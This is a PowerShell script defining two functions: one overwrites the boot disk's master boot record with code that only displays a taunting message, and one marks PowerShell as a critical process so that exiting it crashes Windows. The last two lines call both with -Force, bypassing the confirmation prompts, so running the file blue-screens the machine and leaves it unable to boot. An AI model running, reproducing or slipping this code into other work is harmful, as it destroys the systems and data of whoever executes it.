function Set-MasterBootRecord
{
    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'High')] Param (
        [ValidateLength(1, 479)]
        [String]
        $BootMessage = 'Stop-Crying; Get-NewHardDrive',

        [Switch]
        $RebootImmediately,

        [Switch]
        $Force
    )

    if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator'))
    {
        throw 'This script must be executed from an elevated command prompt.'
    }

    if (!$Force)
    {
        if (!$psCmdlet.ShouldContinue('Do you want to continue?','Set-MasterBootRecord prevent your machine from booting.'))
        {
            return
        }
    }

    #region define P/Invoke types dynamically
    $DynAssembly = New-Object System.Reflection.AssemblyName('Win32')
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32', $False)

    $TypeBuilder = $ModuleBuilder.DefineType('Win32.Kernel32', 'Public, Class')
    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
    $SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor,
        @('kernel32.dll'),
        [Reflection.FieldInfo[]]@($SetLastError),
        @($True))

    # Define [Win32.Kernel32]::DeviceIoControl
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('DeviceIoControl',
        'kernel32.dll',
        ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
        [Reflection.CallingConventions]::Standard,
        [Bool],
        [Type[]]@([IntPtr], [UInt32], [IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32].MakeByRefType(), [IntPtr]),
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::Auto)
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

    # Define [Win32.Kernel32]::CreateFile
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('CreateFile',
        'kernel32.dll',
        ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
        [Reflection.CallingConventions]::Standard,
        [IntPtr],
        [Type[]]@([String], [Int32], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr]),
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::Ansi)
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

    # Define [Win32.Kernel32]::WriteFile
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('WriteFile',
        'kernel32.dll',
        ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
        [Reflection.CallingConventions]::Standard,
        [Bool],
        [Type[]]@([IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType(), [IntPtr]),
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::Ansi)
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

    # Define [Win32.Kernel32]::CloseHandle
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('CloseHandle',
        'kernel32.dll',
        ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
        [Reflection.CallingConventions]::Standard,
        [Bool],
        [Type[]]@([IntPtr]),
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::Auto)
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

    $Kernel32 = $TypeBuilder.CreateType()
    #endregion

    $LengthBytes = [BitConverter]::GetBytes(([Int16] ($BootMessage.Length + 5)))
    # Convert the boot message to a byte array
    $MessageBytes = [Text.Encoding]::ASCII.GetBytes(('PS > ' + $BootMessage))

    [Byte[]] $MBRInfectionCode = @(
        0xb8, 0x12, 0x00,         # MOV  AX, 0x0012 ; CMD: Set video mode, ARG: text resolution 80x30, pixel resolution 640x480, colors 16/256K, VGA
        0xcd, 0x10,               # INT  0x10       ; BIOS interrupt call - Set video mode
        0xb8, 0x00, 0x0B,         # MOV  AX, 0x0B00 ; CMD: Set background color
        0xbb, 0x01, 0x00,         # MOV  BX, 0x000F ; Background color: Blue
        0xcd, 0x10,               # INT  0x10       ; BIOS interrupt call - Set background color
        0xbd, 0x20, 0x7c,         # MOV  BP, 0x7C18 ; Offset to string: 0x7C00 (base of MBR code) + 0x20
        0xb9) + $LengthBytes + @( # MOV  CX, 0x0018 ; String length
        0xb8, 0x01, 0x13,         # MOV  AX, 0x1301 ; CMD: Write string, ARG: Assign BL attribute (color) to all characters
        0xbb, 0x0f, 0x00,         # MOV  BX, 0x000F ; Page Num: 0, Color: White
        0xba, 0x00, 0x00,         # MOV  DX, 0x0000 ; Row: 0, Column: 0
        0xcd, 0x10,               # INT  0x10       ; BIOS interrupt call - Write string
        0xe2, 0xfe                # LOOP 0x16       ; Print all characters to the buffer
        ) + $MessageBytes

    $MBRSize = [UInt32] 512

    if ($MBRInfectionCode.Length -gt ($MBRSize - 2))
    {
        throw "The size of the MBR infection code cannot exceed $($MBRSize - 2) bytes."
    }

    # Allocate 512 bytes for the MBR
    $MBRBytes = [Runtime.InteropServices.Marshal]::AllocHGlobal($MBRSize)

    # Zero-initialize the allocated unmanaged memory
    0..511 | % { [Runtime.InteropServices.Marshal]::WriteByte([IntPtr]::Add($MBRBytes, $_), 0) }

    [Runtime.InteropServices.Marshal]::Copy($MBRInfectionCode, 0, $MBRBytes, $MBRInfectionCode.Length)

    # Write boot record signature to the end of the MBR
    [Runtime.InteropServices.Marshal]::WriteByte([IntPtr]::Add($MBRBytes, ($MBRSize - 2)), 0x55)
    [Runtime.InteropServices.Marshal]::WriteByte([IntPtr]::Add($MBRBytes, ($MBRSize - 1)), 0xAA)

    # Get the device ID of the boot disk
    $DeviceID = Get-WmiObject -Class Win32_DiskDrive -Filter 'Index = 0' | Select-Object -ExpandProperty DeviceID

    $GENERIC_READWRITE = 0x80000000 -bor 0x40000000
    $FILE_SHARE_READWRITE = 2 -bor 1
    $OPEN_EXISTING = 3

    # Obtain a read handle to the raw disk
    $DriveHandle = $Kernel32::CreateFile($DeviceID, $GENERIC_READWRITE, $FILE_SHARE_READWRITE, 0, $OPEN_EXISTING, 0, 0)

    if ($DriveHandle -eq ([IntPtr] 0xFFFFFFFF))
    {
        throw "Unable to obtain read/write handle to $DeviceID"
    }

    $BytesReturned = [UInt32] 0
    $BytesWritten =  [UInt32] 0
    $FSCTL_LOCK_VOLUME =   0x00090018
    $FSCTL_UNLOCK_VOLUME = 0x0009001C

    $null = $Kernel32::DeviceIoControl($DriveHandle, $FSCTL_LOCK_VOLUME, 0, 0, 0, 0, [Ref] $BytesReturned, 0)
    $null = $Kernel32::WriteFile($DriveHandle, $MBRBytes, $MBRSize, [Ref] $BytesWritten, 0)
    $null = $Kernel32::DeviceIoControl($DriveHandle, $FSCTL_UNLOCK_VOLUME, 0, 0, 0, 0, [Ref] $BytesReturned, 0)
    $null = $Kernel32::CloseHandle($DriveHandle)

    Start-Sleep -Seconds 2

    [Runtime.InteropServices.Marshal]::FreeHGlobal($MBRBytes)

    Write-Verbose 'Master boot record overwritten successfully.'

    if ($RebootImmediately)
    {
        Restart-Computer -Force
    }
}
function Set-CriticalProcess
{

    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'High')] Param (
        [Switch]
        $Force,

        [Switch]
        $ExitImmediately
    )

    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
    {
        throw 'You must run Set-CriticalProcess from an elevated PowerShell prompt.'
    }

    $Response = $True

    if (!$Force)
    {
        $Response = $psCmdlet.ShouldContinue('Have you saved all your work?', 'The machine will blue screen when you exit PowerShell.')
    }
    
    if (!$Response)
    {
        return
    }

    $DynAssembly = New-Object System.Reflection.AssemblyName('BlueScreen')
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('BlueScreen', $False)

    # Define [ntdll]::NtQuerySystemInformation method
    $TypeBuilder = $ModuleBuilder.DefineType('BlueScreen.Win32.ntdll', 'Public, Class')
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('NtSetInformationProcess',
                                                        'ntdll.dll',
                                                        ([Reflection.MethodAttributes] 'Public, Static'),
                                                        [Reflection.CallingConventions]::Standard,
                                                        [Int32],
                                                        [Type[]] @([IntPtr], [UInt32], [IntPtr].MakeByRefType(), [UInt32]),
                                                        [Runtime.InteropServices.CallingConvention]::Winapi,
                                                        [Runtime.InteropServices.CharSet]::Auto)

    $ntdll = $TypeBuilder.CreateType()

    $ProcHandle = [Diagnostics.Process]::GetCurrentProcess().Handle
    $ReturnPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(4)

    $ProcessBreakOnTermination = 29
    $SizeUInt32 = 4

    try
    {
        $null = $ntdll::NtSetInformationProcess($ProcHandle, $ProcessBreakOnTermination, [Ref] $ReturnPtr, $SizeUInt32)
    }
    catch
    {
        return
    }

    Write-Verbose 'PowerShell is now marked as a critical process and will blue screen the machine upon exiting the process.'

    if ($ExitImmediately)
    {
        Stop-Process -Id $PID
    }
} 
Set-CriticalProcess -Force -Verbose
Set-MasterBootRecord -Force
